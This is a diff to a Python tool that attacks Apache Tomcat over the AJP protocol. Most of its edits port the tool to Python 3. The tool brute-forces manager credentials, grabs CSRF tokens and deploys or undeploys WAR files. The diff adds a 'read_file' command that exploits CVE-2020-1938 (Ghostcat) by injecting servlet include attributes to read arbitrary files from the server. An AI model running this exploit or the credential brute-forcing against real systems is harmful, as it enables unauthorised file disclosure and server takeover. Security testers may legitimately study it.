@@ -16,34 +16,21 @@
 from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException
 from pprint import pprint, pformat
 
+from base64 import b64encode
 import socket
 import argparse
 import logging
 import re
 import os
-from StringIO import StringIO
 import logging
-from colorlog import ColoredFormatter
-from urllib import unquote
+try:
+	from urllib import unquote
+except ImportError:
+	from urllib.parse import unquote
 
 def setup_logger():
-	"""Return a logger with a default ColoredFormatter."""
-	formatter = ColoredFormatter(
-		"[%(asctime)s.%(msecs)03d] %(log_color)s%(levelname)-8s%(reset)s %(white)s%(message)s",
-		datefmt="%Y-%m-%d %H:%M:%S",
-		reset=True,
-		log_colors={
-			'DEBUG':	'bold_purple',
-			'INFO':	 'bold_green',
-			'WARNING':  'bold_yellow',
-			'ERROR':	'bold_red',
-			'CRITICAL': 'bold_red',
-		}
-	)
-
 	logger = logging.getLogger('meow')
 	handler = logging.StreamHandler()
-	handler.setFormatter(formatter)
 	logger.addHandler(handler)
 	logger.setLevel(logging.DEBUG)
 
@@ -88,13 +75,13 @@ class Tomcat(object):
 		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		self.socket.connect((target_host, target_port))
-		self.stream = self.socket.makefile("rb", bufsize=0)
+		self.stream = self.socket.makefile("rb")
 
 
 	def test_password(self, user, password):
 		res = False
 		stop = False
-		self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + ("%s:%s" % (user, password)).encode('base64').replace('\n', '')
+		self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + b64encode("%s:%s" % (user, password)).replace('\n', '')
 		while not stop:
 			logger.debug("testing %s:%s" % (user, password))
 			responses = self.forward_request.send_and_receive(self.socket, self.stream)
@@ -153,7 +140,8 @@ class Tomcat(object):
 		self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))
 		logger.debug("Getting resource at ajp13://%s:%d%s" % (self.target_host, self.target_port, req_uri))
 		if user is not None and password is not None:
-			self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + ("%s:%s" % (user, password)).encode('base64').replace('\n', '')
+			creds = b64encode(("%s:%s" % (user, password)).encode('utf-8')).decode('utf-8')
+			self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + creds
 
 		for h in headers:
 			self.forward_request.request_headers[h] = headers[h]
@@ -179,9 +167,9 @@ class Tomcat(object):
 			with open("/tmp/request", "w+b") as f:
 				s_form_header = '------WebKitFormBoundaryb2qpuwMoVtQJENti\r\nContent-Disposition: form-data; name="deployWar"; filename="%s"\r\nContent-Type: application/octet-stream\r\n\r\n' % os.path.basename(filename)
 				s_form_footer = '\r\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\r\n'
-				f.write(s_form_header)
+				f.write(s_form_header.encode('utf-8'))
 				f.write(f_input.read())
-				f.write(s_form_footer)
+				f.write(s_form_footer.encode('utf-8'))
 
 		data_len = os.path.getsize("/tmp/request")
 
@@ -223,21 +211,21 @@ class Tomcat(object):
 	def get_version(self):
 		hdrs, data = self.get_error_page()
 		for d in data:
-			s = re.findall('(Apache Tomcat/[0-9\.]+) ', d.data)
+			s = re.findall('(Apache Tomcat/[0-9\.]+) ', d.data.decode('utf-8'))
 			if len(s) > 0:
 				return s[0]
 
 	def get_csrf_token(self, user, password, old_version, headers={}, query=[]):
 		# first we request the manager page to get the CSRF token
 		hdrs, rdata = self.perform_request("/manager/html", headers=headers, user=user, password=password)
-		deploy_csrf_token = re.findall('(org.apache.catalina.filters.CSRF_NONCE=[0-9A-F]*)"', "".join([d.data for d in rdata]))
+		deploy_csrf_token = re.findall('(org.apache.catalina.filters.CSRF_NONCE=[0-9A-F]*)"', "".join([d.data.decode('utf8') for d in rdata]))
 		if old_version == False:
 			if len(deploy_csrf_token) == 0:
 				logger.critical("Failed to get CSRF token. Check the credentials")
 				return
 
 			logger.debug('CSRF token = %s' % deploy_csrf_token[0])
-		obj = re.match("(?P<cookie>JSESSIONID=[0-9A-F]*); Path=/manager(/)?; HttpOnly", hdrs.response_headers.get('Set-Cookie', ''))
+		obj = re.match("(?P<cookie>JSESSIONID=[0-9A-F]*); Path=/manager(/)?; HttpOnly", hdrs.response_headers.get('Set-Cookie', '').decode('utf-8'))
 		if obj is not None:
 			return deploy_csrf_token[0], obj
 		return deploy_csrf_token[0], None
@@ -262,7 +250,7 @@ class Tomcat(object):
 		hdrs, data = self.perform_request("/manager/html/", headers=headers, method="GET", user=user, password=password, attributes=attributes)
 		found = []
 		for d in data:
-			im = re.findall('/manager/html/expire\?path=([^&]*)&', d.data)
+			im = re.findall('/manager/html/expire\?path=([^&]*)&', d.data.decode('utf8'))
 			for app in im:
 				found.append(unquote(app))
 		return found
@@ -296,7 +284,7 @@ class Tomcat(object):
 		while r.prefix_code != AjpResponse.END_RESPONSE:
 			r = AjpResponse.receive(self.stream)
 			if r.prefix_code == 3:
-				f = re.findall(regex, r.data)
+				f = re.findall(regex, r.data.decode('utf-8'))
 				if len(f) > 0:
 					found = True
 		if found:
@@ -349,6 +337,11 @@ if __name__ == "__main__":
 	parser_upload.add_argument("-H", "--headers", type=str, default={}, help="Custom headers")
 	parser_upload.add_argument("--old-version", action='store_true', default=False, help="Old version of Tomcat that does not implement anti-CSRF token")
 
+	read_file = subparsers.add_parser('read_file', help='Exploit CVE-2020-1938')
+	read_file.set_defaults(which='read_file')
+	read_file.add_argument("file_path", type=str, help="File to read")
+	read_file.add_argument("-w", "--webapp", type=str, default="", help="Webapp")
+
 	args = parser.parse_args()
 
 
@@ -365,7 +358,7 @@ if __name__ == "__main__":
 	elif args.which == 'upload':
 		bf.upload(args.filename, args.user, args.password, args.old_version, args.headers)
 	elif args.which == 'version':
-		print bf.get_version()
+		print(bf.get_version())
 	elif args.which == 'list':
 		apps = bf.list_installed_applications(args.user, args.password, args.old_version, args.headers)
 		logger.info("Installed applications:")
@@ -373,3 +366,12 @@ if __name__ == "__main__":
 			logger.info('- ' + app)
 	elif args.which == 'undeploy':
 		bf.undeploy(args.path, args.user, args.password, args.old_version, args.headers)
+	elif args.which == 'read_file':
+		attributes = [
+			{"name": "req_attribute", "value": ("javax.servlet.include.request_uri", "1",)},
+			{"name": "req_attribute", "value": ("javax.servlet.include.path_info", args.file_path,)},
+			{"name": "req_attribute", "value": ("javax.servlet.include.servlet_path", "",)},
+		]
+		hdrs, data = bf.perform_request("/" + args.webapp + "/xxxxx.jsp", attributes=attributes)
+		for d in data:
+			print(d.data.decode('utf8'))
